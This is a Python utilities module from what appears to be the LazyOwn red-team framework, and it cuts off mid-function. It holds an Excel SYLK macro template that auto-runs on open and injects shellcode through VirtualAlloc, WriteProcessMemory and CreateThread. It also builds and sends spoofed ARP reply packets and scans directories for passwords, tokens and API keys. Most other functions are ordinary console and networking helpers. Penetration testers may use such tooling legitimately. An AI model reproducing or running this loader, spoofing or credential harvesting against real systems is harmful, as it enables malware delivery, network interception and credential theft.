"""
utils.py

Autor: Gris Iscomeback 
Correo electrónico: grisiscomeback[at]gmail[dot]com
Fecha de creación: 09/06/2024
Licencia: GPL v3

Descripción: Este archivo contiene la definición de la lógica de todas las funciones usadas en la clase LazyOwnShell

██╗      █████╗ ███████╗██╗   ██╗ ██████╗ ██╗    ██╗███╗   ██╗
██║     ██╔══██╗╚══███╔╝╚██╗ ██╔╝██╔═══██╗██║    ██║████╗  ██║
██║     ███████║  ███╔╝  ╚████╔╝ ██║   ██║██║ █╗ ██║██╔██╗ ██║
██║     ██╔══██║ ███╔╝    ╚██╔╝  ██║   ██║██║███╗██║██║╚██╗██║
███████╗██║  ██║███████╗   ██║   ╚██████╔╝╚███╔███╔╝██║ ╚████║
╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝    ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝

"""
import re
import os
import csv
import sys
import ssl
import json
import time
import glob
import shlex
import pickle
import signal
import base64
import string
import ctypes
import socket
import struct
import random
import argparse
import binascii
import readline
import requests
import tempfile
import itertools
import threading
import subprocess
import urllib.parse
import urllib.request
import importlib.util
from PIL import Image
from threading import Timer
from bs4 import BeautifulSoup
from itertools import product
from pykeepass import PyKeePass
from libnmap.parser import NmapParser
from libnmap.process import NmapProcess
from impacket.dcerpc.v5 import transport
from datetime import datetime, timedelta, date
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import quote, unquote, urlparse
from impacket.dcerpc.v5.dcomrt import IObjectExporter
from modules.lazyencoder_decoder import encode, decode
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_NONE

RESET = "\033[0m"
BOLD = "\033[1m"
UNDERLINE = "\033[4m"
INVERT = "\033[7m"
BLINK = "\033[5m"
BLACK = "\033[30m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
MAGENTA = "\033[35m"
CYAN = "\033[36m"
WHITE = "\033[37m"
BG_BLACK = "\033[40m"
BG_RED = "\033[41m"
BG_GREEN = "\033[42m"
BG_YELLOW = "\033[43m"
BG_BLUE = "\033[44m"
BG_MAGENTA = "\033[45m"
BG_CYAN = "\033[46m"
BG_WHITE = "\033[47m"
window_count = 0
session_name = "lazyown_sessions"
NOBANNER = False
COMMAND = None
RUN_AS_ROOT = False
os.environ['OPENSSL_CONF'] = '/usr/lib/ssl/openssl.cnf'
global payload_url, target_domain, concurrency, request_timeout, include_subdomains
OLD_BANNER = f"""{GREEN}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⡤⠴⠶⠖⠒⠛⠛⠀⠀⠀⠒⠒⢰⠖⢠⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣭⠷⠞⠉⠫⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠈⠉⠒⠲⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠲⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⣿⣿⣿⣷⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠑⢄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⡾⢋⠷⣻⣿⣟⢿⣿⠿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠸⣄⠀⠀⠀⠀
⠀⠀⠀⣀⣾⣯⢶⣿⣾⣿⡟⠁⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢦⠀⠀⠀
⠀⠀⢠⣿⣿⣤⣽⣿⣿⣿⣃⣴⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠈⢀⣽⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠠⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢸⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣦⣴⣆⣀⣀⣀⣀⢀⠀⠀⣐⠄⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠀⠀⢀⣀⠴⠶⠛⠛⠛⠛⠛⠳⠶⣶⣦⡀⠀⠀⠘
⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠐⠤⣯⣀⡰⡋⣡⣐⣶⣽⣶⣶⣾⣿⣷⣶⣤⣝⡣⠀⠀⠀
⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡉⣿⣿⣿⣿⣿⣿⣿⣭⡿⣿⡋⠉⠙⢿⡦⠀⠀⠀⠀⠀⠀⠀⢀⣌⣼⡩⢻⣷⣿⣿⣿⣿⣿⣿⡏⣛⢿⣿⣿⡿⠃⢰⠀⠀
⠀⢿⣿⣿⣿⣿⣿⣿⣛⠿⣷⣄⣙⣿⠿⠿⠟⠛⣿⣿⣜⣶⡂⡉⣿⣧⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⢻⣾⡛⠛⢿⠿⠿⠟⢻⣧⣽⣿⠿⠋⠀⠄⢸⣧⠔
⠀⠘⢿⣿⣿⣿⣿⢿⣿⣿⣷⣾⣭⣿⣿⣟⣛⣛⣛⣛⢿⣽⣿⣧⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠃⣿⡿⠿⠿⠿⠿⢻⣛⣛⣋⣉⣁⠤⠒⠒⠂⣠⣿⠏⠀
⠀⠀⠈⠻⢿⣿⣿⣶⣄⣉⠉⠉⠉⠉⠉⠛⠉⠉⠁⠉⠁⢹⢻⣿⣏⢹⠀⠘⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⣀⣴⠿⠝⠁⠀
⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣷⣶⣶⣶⣦⣴⣴⣾⢬⡤⢬⡜⠛⠀⢾⢿⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠶⣦⣤⣄⣤⣐⣢⣤⣴⣾⠟⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣯⣤⣄⡤⣄⣠⡤⣄⣀⠀⠀⠀⠀⡀⠀⠀⠀⡀⠀⠀⢀⣠⣤⣴⣤⣤⢹⣿⣿⣿⡿⠛⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣬⣥⣤⡴⠶⠶⠖⠒⠛⠋⠉⡩⢁⣼⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡈⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢻⡓⠁⠁⠀⠀⠀⠀⠀⠀⠀⠀⢠⢶⣧⣻⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠾⠀⠀⠀⠀⠀⠀⠀⠀⣀⡜⠼⣷⣸⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣶⣄⣀⣀⣀⡀⠀⢀⠀⠀⣠⡼⣋⣪⣾⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⡟⠙⡀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠛⡿⡁⡟⣡⢀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⡟⠉⢛⠀⣸⠆⠈⠹⠀⠀⠀⠀⠀⠀⠀{RED}
 ██▓    ▄▄▄      ▒███████▒▓██   ██▓ ▒█████   █     █░███▄    █                
▓██▒   ▒████▄    ▒ ▒ ▒ ▄▀░ ▒██  ██▒▒██▒  ██▒▓█░ █ ░█░██ ▀█   █                
▒██░   ▒██  ▀█▄  ░ ▒ ▄▀▒░   ▒██ ██░▒██░  ██▒▒█░ █ ░█▓██  ▀█ ██▒               
▒██░   ░██▄▄▄▄██   ▄▀▒   ░  ░ ▐██▓░▒██   ██░░█░ █ ░█▓██▒  ▐▌██▒               
░██████▒▓█   ▓██▒▒███████▒  ░ ██▒▓░░ ████▓▒░░░██▒██▓▒██░   ▓██░               
░ ▒░▓  ░▒▒   ▓▒█░░▒▒ ▓░▒░▒   ██▒▒▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒ ░ ▒░   ▒ ▒                
░ ░ ▒  ░ ▒   ▒▒ ░░░▒ ▒ ░ ▒ ▓██ ░▒░   ░ ▒ ▒░   ▒ ░ ░ ░ ░░   ░ ▒░               
  ░ ░    ░   ▒   ░ ░ ░ ░ ░ ▒ ▒ ░░  ░ ░ ░ ▒    ░   ░    ░   ░ ░                
    ░  ░     ░  ░  ░ ░     ░ ░         ░ ░      ░            ░                
                 ░         ░ ░                                                
  █████▒██▀███   ▄▄▄       ███▄ ▄███▓▓█████  █     █░ ▒█████   ██▀███   ██ ▄█▀
▓██   ▒▓██ ▒ ██▒▒████▄    ▓██▒▀█▀ ██▒▓█   ▀ ▓█░ █ ░█░▒██▒  ██▒▓██ ▒ ██▒ ██▄█▒ 
▒████ ░▓██ ░▄█ ▒▒██  ▀█▄  ▓██    ▓██░▒███   ▒█░ █ ░█ ▒██░  ██▒▓██ ░▄█ ▒▓███▄░ 
░▓█▒  ░▒██▀▀█▄  ░██▄▄▄▄██ ▒██    ▒██ ▒▓█  ▄ ░█░ █ ░█ ▒██   ██░▒██▀▀█▄  ▓██ █▄ 
░▒█░   ░██▓ ▒██▒ ▓█   ▓██▒▒██▒   ░██▒░▒████▒░░██▒██▓ ░ ████▓▒░░██▓ ▒██▒▒██▒ █▄
 ▒ ░   ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ▒░   ░  ░░░ ▒░ ░░ ▓░▒ ▒  ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░▒ ▒▒ ▓▒
 ░       ░▒ ░ ▒░  ▒   ▒▒ ░░  ░      ░ ░ ░  ░  ▒ ░ ░    ░ ▒ ▒░   ░▒ ░ ▒░░ ░▒ ▒░
 ░ ░     ░░   ░   ░   ▒   ░      ░      ░     ░   ░  ░ ░ ░ ▒    ░░   ░ ░ ░░ ░ 
          ░           ░  ░       ░      ░  ░    ░        ░ ░     ░     ░  ░   
    [⚠] Starting 👽 LazyOwn RedTeam Framew0rk ☠ [;,;] """
BANNER = "[⚠] Starting 👽 LazyOwn RedTeam Framew0rk ☠ [;,;] "
SYLK_TEMPLATE = """ID;P
O;E
NN;NAuto_open;ER1C1
C;X1;Y1;ER1C2()
C;X1;Y2;ECALL("Kernel32","VirtualAlloc","JJJJJ",0,1000000,4096,64)
C;X1;Y3;ESELECT(R1C2:R1000:C2,R1C2)
C;X1;Y4;ESET.VALUE(R1C3, 0)
C;X1;Y5;EWHILE(LEN(ACTIVE.CELL())>0)
C;X1;Y6;ECALL("Kernel32","WriteProcessMemory","JJJCJJ",-1, R2C1 + R1C3 * 20,ACTIVE.CELL(), LEN(ACTIVE.CELL()), 0)
C;X1;Y7;ESET.VALUE(R1C3, R1C3 + 1)
C;X1;Y8;ESELECT(, "R[1]C")
C;X1;Y9;ENEXT()
C;X1;Y10;ECALL("Kernel32","CreateThread","JJJJJJJ",0, 0, R2C1, 0, 0, 0)
C;X1;Y11;EHALT()
"""
def parse_ip_mac(input_string):
    """
    Extracts IP and MAC addresses from a formatted input string using a regular expression.

    The input string is expected to be in the format: 'IP: (192.168.1.222) MAC: ec:c3:02:b0:4c:96'.
    The function uses a regular expression to match and extract the IP address and MAC address from the input.

    Args:
        input_string (str): The formatted string containing the IP and MAC addresses.

    Returns:
        tuple: A tuple containing the extracted IP address and MAC address. If the format is incorrect, returns (None, None).
    """
    match = re.match(r"IP:\s*\(([\d.]+)\)\s*MAC:\s*([\da-f:]+)", input_string.strip())
    if match:
        target_ip, target_mac = match.groups()
        return target_ip, target_mac
    else:
        print_error("Error: Input must be in the format 'IP: (192.168.1.222) MAC: ec:c3:02:b0:4c:96'.")
        return None, None

def create_arp_packet(src_mac, src_ip, dst_ip, dst_mac):
    """
    Constructs an ARP packet with the given source and destination IP and MAC addresses.

    The function creates both Ethernet and ARP headers, combining them into a complete ARP packet.

    Args:
        src_mac (str): Source MAC address in the format 'xx:xx:xx:xx:xx:xx'.
        src_ip (str): Source IP address in dotted decimal format (e.g., '192.168.1.1').
        dst_ip (str): Destination IP address in dotted decimal format (e.g., '192.168.1.2').
        dst_mac (str): Destination MAC address in the format 'xx:xx:xx:xx:xx:xx'.

    Returns:
        bytes: The constructed ARP packet containing the Ethernet and ARP headers.
    """
    eth_header = struct.pack(
        '!6s6sH',
        binascii.unhexlify(dst_mac.replace(':', '')),
        binascii.unhexlify(src_mac.replace(':', '')),
        0x0806
    )

    arp_header = struct.pack(
        '!HHBBH6s4s6s4s',
        0x0001,
        0x0800,
        6,      
        4,      
        0x0002, 
        binascii.unhexlify(src_mac.replace(':', '')),
        socket.inet_aton(src_ip),
        binascii.unhexlify(dst_mac.replace(':', '')),
        socket.inet_aton(dst_ip) 
    )

    return eth_header + arp_header

def send_packet(packet, iface):
    """
    Sends a raw ARP packet over the specified network interface.

    The function creates a raw socket, binds it to the specified network interface, and sends the given packet.

    Args:
        packet (bytes): The ARP packet to be sent.
        iface (str): The name of the network interface to use for sending the packet (e.g., 'eth0').

    Raises:
        OSError: If an error occurs while creating the socket or sending the packet.
    """
    with socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806)) as sock:
        sock.bind((iface, 0))
        sock.send(packet)

def load_version():
    """
    Load the version number from the 'version.json' file.

    This function attempts to open the 'version.json' file and load its contents. 
    If the file is found, it retrieves the version number from the JSON data. 
    If the version key does not exist, it returns a default version 'release/v0.0.14'. 
    If the file is not found, it also returns the default version.

    Returns:
    - str: The version number from the file or the default version if the file is not found or the version key is missing.
    """    
    try:
        with open('version.json', 'r') as f:
            data = json.load(f)
            return data.get('version', 'release/v0.0.14')
    except FileNotFoundError:
        return 'release/v0.0.14'

version = load_version()

def print_error(error):
    """
    Prints an error message to the console.

    This function takes an error message as input and prints it to the console
    with a specific format to indicate that it is an error.

    :param error: The error message to be printed.
    :type error: str
    :return: None
    """
    print(f"    {YELLOW}[-]{RED} {error}{RESET} [☠]")
    return


def print_msg(msg):
    """
    Prints a message to the console.

    This function takes a message as input and prints it to the console
    with a specific format to indicate that it is an informational message.

    :param msg: The message to be printed.
    :type msg: str
    :return: None
    """

    print(f"    {GREEN}[+]{WHITE} {msg}{RESET} [👽]")
    return


def print_warn(warn):
    """
    Prints a warning message to the console.

    This function takes a warning message as input and prints it to the console
    with a specific format to indicate that it is a warning.

    :param warn: The warning message to be printed.
    :type warn: str
    :return: None
    """

    print(f"    {MAGENTA}[~]{YELLOW} {warn}{RESET} [⚠]")
    return


def signal_handler(sig, frame):
    """
    Handles signals such as Control + C and shows a message on how to exit.

    This function is used to handle signals like Control + C (SIGINT) and prints
    a warning message instructing the user on how to exit the program using the
    commands 'exit', 'q', or 'qa'.

    :param sig: The signal number.
    :type sig: int
    :param frame: The current stack frame.
    :type frame: frame
    :return: None
    """

    global should_exit
    print_warn(
        f"{RED}{YELLOW} To exit, use the command{GREEN} exit, q, or qa ...{RESET}"
    )
    should_exit = True
    readline.set_history_length(0)
    return


signal.signal(signal.SIGINT, signal_handler)


def check_rhost(rhost):
    """
    Checks if the remote host (rhost) is defined and shows an error message if it is not.

    This function verifies if the `rhost` parameter is set. If it is not defined,
    an error message is printed, providing an example and directing the user to
    additional help.

    :param rhost: The remote host to be checked.
    :type rhost: str
    :return: True if rhost is defined, False otherwise.
    :rtype: bool
    """

    if not rhost:
        print_error(
            f"rhost must be set, {GREEN}Example: set rhost 10.10.10.10, {WHITE}more info see help set, or help <TOPIC> {RESET}"
        )
        return False
    return True


def check_lhost(lhost):
    """
    Checks if the local host (lhost) is defined and shows an error message if it is not.

    This function verifies if the `lhost` parameter is set. If it is not defined,
    an error message is printed, providing an example and directing the user to
    additional help.

    :param lhost: The local host to be checked.
    :type lhost: str
    :return: True if lhost is defined, False otherwise.
    :rtype: bool
    """

    if not lhost:
        print_error(
            f"lhost must be set, {GREEN}Example: set lhost 10.10.10.10, {WHITE}more info see help set, or help <TOPIC> {RESET}"
        )
        return False
    return True


def check_lport(lport):
    """
    Checks if the local port (lport) is defined and shows an error message if it is not.

    This function verifies if the `lport` parameter is set. If it is not defined,
    an error message is printed, providing an example and directing the user to
    additional help.

    :param lport: The local port to be checked.
    :type lport: int or str
    :return: True if lport is defined, False otherwise.
    :rtype: bool
    """

    if not lport:
        print_error(
            f"lport must be set, {GREEN}Example: set lport 5555, {WHITE}more info see help set, or help <TOPIC> {RESET}"
        )
        return False
    return True


def is_binary_present(binary_name):
    """
    Internal function to verify if a binary is present on the operating system.

    This function checks if a specified binary is available in the system's PATH
    by using the `which` command. It returns True if the binary is found and False
    otherwise.

    :param binary_name: The name of the binary to be checked.
    :type binary_name: str
    :return: True if the binary is present, False otherwise.
    :rtype: bool
    """
    result = os.system(f"which {binary_name} > /dev/null 2>&1")
    return result == 0


def handle_multiple_rhosts(func):
    """
    Internal function to handle multiple remote hosts (rhost) for operations.

    This function is a decorator that allows an operation to be performed across
    multiple remote hosts specified in `self.params["rhost"]`. It converts a single
    remote host into a list if necessary, and then iterates over each host,
    performing the given function with each host. After the operation, it restores
    the original remote host value.

    :param func: The function to be decorated and executed for each remote host.
    :type func: function
    :return: The decorated function.
    :rtype: function
    """

    def wrapper(self, *args, **kwargs):
        """internal wrapper of internal function to implement multiples rhost to operate. """
        rhosts = self.params["rhost"]
        if isinstance(rhosts, str):
            rhosts = [rhosts]  

        for rhost in rhosts:
            if not check_rhost(rhost):
                continue
            original_rhost = self.params["rhost"]
            self.params["rhost"] = rhost  
            func(self, *args, **kwargs)
            self.params["rhost"] = original_rhost  

    return wrapper



def check_sudo():
    """
    Checks if the script is running with superuser (sudo) privileges, and if not,
    restarts the script with sudo privileges.

    This function verifies if the script is being executed with root privileges
    by checking the effective user ID. If the script is not running as root,
    it prints a warning message and restarts the script using sudo.

    :return: None
    """

    if os.geteuid() != 0:
        print_warn(
            "Este script necesita permisos de superusuario. Relanzando con sudo..."
        )
        args = ["sudo", sys.executable] + sys.argv
        os.execvpe("sudo", args, os.environ)


def activate_virtualenv(venv_path):
    """
    Activates a virtual environment and starts an interactive shell.

    This function activates a virtual environment located at `venv_path` and then
    launches an interactive bash shell with the virtual environment activated.

    :param venv_path: The path to the virtual environment directory.
    :type venv_path: str
    :return: None
    """

    process = subprocess.Popen(
        ["bash", "-c", f"source {venv_path}/bin/activate && exec bash"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )

    # Captura la salida del proceso hijo
    stdout, stderr = process.communicate()
    print_msg(f"Environment Activated.{RESET}")


def parse_proc_net_file(file_path):
    """
    Internal function to parse a /proc/net file and extract network ports.

    This function reads a file specified by `file_path`, processes each line to
    extract local addresses and ports, and converts them from hexadecimal to decimal.
    The IP addresses are converted from hexadecimal format to standard dot-decimal
    notation. The function returns a list of tuples, each containing an IP address
    and a port number.

    :param file_path: The path to the /proc/net file to be parsed.
    :type file_path: str
    :return: A list of tuples, each containing an IP address and a port number.
    :rtype: list of tuple
    """

    ports = []
    try:
        with open(file_path, "r") as f:
            lines = f.readlines()

        for line in lines[1:]:  # Skip the header line
            parts = line.split()
            if len(parts) < 2:
                continue

            local_address = parts[1]
            # Local address is in the format: "IP:PORT"
            ip, port_hex = local_address.split(":")
            port = int(port_hex, 16)  # Convert hex port to decimal

            # Convert IP address from hex format to standard dot-decimal notation
            ip_parts = [str(int(ip[i : i + 2], 16)) for i in range(0, len(ip), 2)]
            ip_address = ".".join(ip_parts[::-1])  # Reverse the IP parts

            ports.append((ip_address, port))
    except FileNotFoundError:
        print_error(f"File {file_path} not found{RESET}")
    except Exception as e:
        print_error(f"An error occurred: {e}{RESET}")

    return ports


def get_open_ports():
    """
    Internal function to get open TCP and UDP ports on the operating system.

    This function uses the `parse_proc_net_file` function to extract open TCP and UDP
    ports from the corresponding /proc/net files. It returns two lists: one for TCP
    ports and one for UDP ports.

    :return: A tuple containing two lists: the first list with open TCP ports and
            the second list with open UDP ports.
    :rtype: tuple of (list of tuple, list of tuple)
    """

    tcp_ports = parse_proc_net_file("/proc/net/tcp")
    udp_ports = parse_proc_net_file("/proc/net/udp")

    return tcp_ports, udp_ports


def find_credentials(directory):
    """
    Searches for potential credentials in files within the specified directory.

    This function uses a regular expression to find possible credentials such as
    passwords, secrets, API keys, and tokens in files within the given directory.
    It iterates through all files in the directory and prints any matches found.

    :param directory: The directory to search for files containing credentials.
    :type directory: str
    :return: None
    """
    regex = re.compile(
        r"(password|passwd|secret|api_key|token)[\s:=]*[\w\d]{6,}", re.IGNORECASE
    )

    for root, dirs, files in os.walk(directory):
        for file in files:
            try:
                with open(os.path.join(root, file), "r") as f:
                    content = f.read()
                    matches = regex.findall(content)
                    if matches:
                        print_msg(
                            f"Credenciales encontradas en {os.path.join(root, file)}:"
                        )
                        for match in matches:
                            print_msg(f"{match}")
            except Exception as e:
                print_error(f"No se pudo leer el archivo {file}: {e}")
        

def rotate_char(c, shift):
    """
    Internal function to rotate characters for ROT cipher.

    This function takes a character and a shift value, and rotates the character
    by the specified shift amount. It only affects alphabetical characters, leaving
    non-alphabetical characters unchanged.

    :param c: The character to be rotated.
    :type c: str
    :param shift: The number of positions to shift the character.
    :type shift: int
    :return: The rotated character.
    :rtype: str
    """

    if c in string.ascii_letters:
        start = ord('a') if c.islower() else ord('A')
        return chr((ord(c) - start + shift) % 26 + start)
    return c

def get_network_info():
    """
    Retrieves network interface information with their associated IP addresses.

    This function executes a shell command to gather network interface details, 
    parses the output to extract interface names and their corresponding IP addresses, 
    and returns this information in a dictionary format. The dictionary keys are
    interface names, and the values are IP addresses.

    :return: A dictionary where the keys are network interface names and the values
             are their associated IP addresses.
    :rtype: dict
    """
    command = (
        'ip a show scope global | '
        'awk \'/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } '
        '/^[[:space:]]*inet / { split($2, a, "/"); print iface " " a[1] }\''
    )
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    output = result.stdout.strip()
    network_info = {}

    for line in output.split('\n'):
        parts = line.split(maxsplit=1)
        if len(parts) == 2:
            iface, ip = parts
            network_info[iface] = ip
        else:
            print_error(f"Formato inesperado en la línea: '{line}'")

    return network_info

def getprompt():
    """Generate a command prompt string with network information and user status.

    :param: None

    :returns: A string representing the command prompt with network information and user status.

    Manual execution:
    To manually get a prompt string with network information and user status, ensure you have `get_network_info()` implemented to return a dictionary of network interfaces and their IPs. Then use the function to create a prompt string based on the current user and network info.

    Example:
    If the function `get_network_info()` returns:
        {
            'tun0': '10.0.0.1',
            'eth0': '192.168.1.2'
        }

    And the user is root, the prompt string generated might be:
        [LazyOwn👽10.0.0.1]# 
    If the user is not root, it would be:
        [LazyOwn👽10.0.0.1]$ 

    If no 'tun' interface is found, the function will use the first available IP or fallback to '127.0.0.1'.
    """

    network_info = get_network_info()
    ip = next((ip for iface, ip in network_info.items() if 'tun' in iface), None)

    if ip is None:
        ip = next(iter(network_info.values()), '127.0.0.1')
    prompt_char = f'{RED}#' if os.geteuid() == 0 else '$'
    prompt = f"""{YELLOW}┌─{YELLOW}[{RED}LazyOwn{WHITE}👽{CYAN}{ip}{YELLOW}]
    {YELLOW}└╼ {BLINK}{GREEN}{prompt_char}{RESET} """.replace('    ','')

    return prompt

def copy2clip(text):
    """
    Copia el texto proporcionado al portapapeles usando xclip.

    Args:
        text (str): El texto que se desea copiar al portapapeles.

    Example:
        copy2clip("Hello, World!")
    """
    try:
        # Usa el comando xclip para copiar el texto al portapapeles
        subprocess.run(['xclip', '-selection', 'clipboard'], input=text.encode(), check=True)
        print_msg(f"Texto copiado al portapapeles. {text}")
    except subprocess.CalledProcessError as e:
        print_error(f"Error al copiar al portapapeles: {e}")
    except FileNotFoundError:
        print_error("xclip no está instalado. Por favor, instálalo usando `sudo apt-get install xclip`.")

def clean_output(output):
    """Elimina secuencias de escape de color y otros caracteres no imprimibles."""

    output = re.sub(r'\x1b\[[0-9;]*[a-zA-Z]', '', output)
    output = re.sub(r'(\x07|\x08|\x0A|\x0D|\x1B|\x7F|\x9B|\033\\|\033\\|\033\[|\033\]|\033\[[\d;]*[a-zA-Z])', '', output)
    output = re.sub(r'\\(?:33\[K|10|7)', '', output)
    output = re.sub(r' +', ' ', output)
    output = '\n'.join(line.strip() for line in output.split('\n') if line.strip())
    return output



def teclado_usuario(filename):
    """
    Procesa un archivo para extraer y mostrar caracteres desde secuencias de escritura específicas.

    Args:
        filename (str): El nombre del archivo a leer.

    Raises:
        FileNotFoundError: Si el archivo no se encuentra.
        Exception: Para otros errores que puedan ocurrir.
    """
    try:
        with open(filename, 'r') as file:
            content = file.readlines()

        output = ""
        for line in content:
            if line.startswith('write(5,'):
                match = re.search(r'write\(5, "(.*?)"', line)
                if match:
                    char = match.group(1)
                    if char in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 -.':
                        output += char
                    elif char == '\\n':
                        print(output)
                        output = ""

        if output:  # Imprimir cualquier salida restante
            print(output)

    except FileNotFoundError:
        print(f"Archivo {filename} no encontrado.")
    except Exception as e:
        print(f"Error: {e}")



def salida_strace(filename):
    """
    Lee un archivo, extrae texto desde secuencias de escritura y muestra el contenido reconstruido.

    Args:
        filename (str): El nombre del archivo a leer.

    Raises:
        FileNotFoundError: Si el archivo no se encuentra.
        Exception: Para otros errores que puedan ocurrir.
    """    
    try:
        with open(filename, 'r') as file:
            content = file.readlines()

        output = ""
        for line in content:
            if line.startswith('write(5,'):
                match = re.search(r'write\(5, "(.*?)"', line)
                if match:
                    text = match.group(1)
                    if len(text) > 1:  # Solo considerar textos con más de un carácter
                        output += text

        if output:
            print("Contenido reconstruido:")
            print(output)
            print("Contenido despues de limpieza")
            print(clean_output(output))

    except FileNotFoundError:
        print(f"Archivo {filename} no encontrado.")
    except Exception as e:
        print(f"Error: {e}")

    
def exploitalert(content):
    """
    Process and display results from ExploitAlert.

    This function checks if the provided content contains any results. 
    If results are present, it prints the title and link for each exploit found, 
    and appends the results to a predata list. If no results are found, 
    it prints an error message.

    Parameters:
    - content (list): A list of dictionaries containing exploit information.

    Returns:
    None
    Thanks to Sicat 🐈
    An excellent tool for CVE detection, I implemented only the keyword search as I had to change some libraries. Soon also for XML generated by nmap :) Total thanks to justakazh. https://github.com/justakazh/sicat/
    """    
    try:
        if len(content) != 0:
            
            print_msg(f"|{GREEN}+ ExploitAlert Result {WHITE}")
            print_msg("|------------------------")


            predata = []
            for data in content:
                print_msg(f"|{BLUE}-{WHITE} Title : {data['name']}")
                print_msg(f"|{BLUE}-{WHITE} Link : https://www.exploitalert.com/view-details.html?id={data['id']}")
                


                predata.append({
                    "title" : data['name'],
                    "link" : f"https://www.exploitalert.com/view-details.html?id={data['id']}"
                })
            print_msg(f"|{BLUE}-{WHITE} Total Result : {GREEN}{len(content)}{WHITE} Exploits Found!")
            data.append({"exploitalert" : predata})
        else:
            print_error(f"|{RED}- No result in ExploitAlert!{WHITE}")
    except:
